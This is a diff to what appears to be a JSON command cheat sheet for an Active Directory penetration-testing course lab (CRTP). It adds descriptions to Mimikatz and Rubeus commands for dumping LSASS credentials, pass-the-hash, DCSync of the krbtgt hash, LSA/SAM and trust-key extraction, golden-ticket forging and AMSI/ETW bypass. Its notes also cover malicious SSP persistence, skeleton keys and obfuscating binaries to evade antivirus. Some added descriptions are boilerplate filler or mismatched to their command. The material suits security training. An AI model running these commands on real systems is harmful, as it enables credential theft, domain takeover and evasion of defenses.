@@ -35,43 +35,53 @@
   "variations": [
     {
       "label": "Dump logon passwords (evasive)",
-      "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
+      "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-logonpasswords\" \"exit\"",
+      "description": "Runs Mimikatz logonpasswords through an evasive loader to dump plaintext credentials and NTLM hashes from LSASS. The loader helps bypass antivirus by avoiding dropping Mimikatz directly to disk."
     },
     {
       "label": "Dump encryption keys (ekeys)",
-      "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-ekeys\" \"exit\""
+      "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-ekeys\" \"exit\"",
+      "description": "Extracts Kerberos encryption keys (AES256, AES128, RC4/NTLM) from LSASS via an evasive loader. These keys are used for forging Kerberos tickets (Golden/Silver/Diamond tickets)."
     },
     {
       "label": "Pass-the-hash into a new process",
-      "command": "Loader.exe -Path <safetykatz_exe> -args \"sekurlsa::evasive-pth /domain:<dc> /user:Administrator /ntlm:<ntlm>\" \"exit\""
+      "command": "Loader.exe -Path <safetykatz_exe> -args \"sekurlsa::evasive-pth /domain:<dc> /user:Administrator /ntlm:<ntlm>\" \"exit\"",
+      "description": "Performs Pass-the-Hash through an evasive loader - spawns a new process authenticated with a stolen NTLM hash. Avoids AV detection that triggers on standard Mimikatz execution."
     },
     {
       "label": "DCSync a user (get krbtgt hash)",
-      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\""
+      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\"",
+      "description": "Performs DCSync through an evasive loader to extract password hashes from the domain controller by simulating replication. The loader wraps Mimikatz to evade endpoint detection."
     },
     {
       "label": "Dump LSA secrets / local SAM",
-      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-lsa /patch\" \"exit\"    # or lsadump::evasive-sam"
+      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-lsa /patch\" \"exit\"    # or lsadump::evasive-sam",
+      "description": "Patches LSASS to dump credentials via an evasive loader. Modifies LSASS in memory to extract stored secrets while avoiding detection of standard Mimikatz on disk."
     },
     {
       "label": "Dump inter-realm trust keys",
-      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-trust /patch\" \"exit\""
+      "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-trust /patch\" \"exit\"",
+      "description": "Extracts inter-domain trust keys via an evasive loader. These keys forge inter-realm TGTs for lateral movement across trusted domains and forests."
     },
     {
       "label": "Elevate token + read DPAPI vault creds",
-      "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'"
+      "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'",
+      "description": "Elevate token + read DPAPI vault creds. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Rubeus evasive golden / silver ticket",
-      "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt"
+      "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "Lab evasive Mimikatz wrapper (C:\\AD\\Tools)",
-      "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in"
+      "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in",
+      "description": "Bypasses the Antimalware Scan Interface (AMSI) in the current PowerShell session. AMSI inspects PowerShell scripts before execution - patching it allows running tools that would otherwise be blocked by AV."
     },
     {
       "label": "Lab evasive cred wrapper — modify then run",
-      "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI"
+      "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI",
+      "description": "Lab evasive cred wrapper — modify then run. See the command syntax for exact parameters and flags."
     }
   ],
   "notes": "Verb map (evasive- prefix on the CRTP custom build):\n- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)\n- sekurlsa::evasive-pth - pass-the-hash into a new logon session\n- lsadump::evasive-dcsync /user:<domain>\\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)\n- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM\n- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)\n- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)\n- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\\Windows\\System32\\mimilsa.log (credential-capture persistence)\n- misc::skeleton - skeleton key (see crtp-skeleton-key)\n- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)\n- Rubeus evasive-golden / evasive-silver - forge tickets in-memory\nAlways run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.",
